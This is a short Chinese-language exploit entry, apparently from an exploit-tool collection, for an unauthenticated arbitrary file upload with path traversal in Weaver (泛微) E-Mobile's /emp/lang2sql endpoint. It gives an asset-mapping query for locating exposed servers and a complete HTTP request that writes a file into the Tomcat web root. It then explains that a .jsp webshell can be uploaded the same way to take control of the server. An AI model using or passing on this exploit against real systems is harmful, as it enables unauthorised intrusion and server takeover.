---
source: "LittleBear4/OA-EXPTOOL"
---

# 泛微E-Mobile lang2sql 任意文件上传漏洞

## 漏洞描述

泛微 E-Mobile 的 `/emp/lang2sql` 接口存在任意文件上传漏洞。该接口未做登录校验，`filename` 参数可控且存在路径遍历，攻击者无需登录即可上传任意文件到服务器 Web 目录，直接获取 Webshell。

## 漏洞影响

```
泛微 E-Mobile
```

## 网络测绘

```
app="泛微-EMobile"
```

## 漏洞复现

```http
POST /emp/lang2sql HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="sql"; filename="../../../../appsvr/tomcat/webapps/ROOT/tmslpwlw.txt"
Content-Type: text/plain

test file content
------WebKitFormBoundary--
```

上传成功后，通过 `GET /tmslpwlw.txt` 即可访问上传的文件。将文件名改为 `.jsp` 后缀并写入 Webshell 内容，即可获取服务器控制权限。
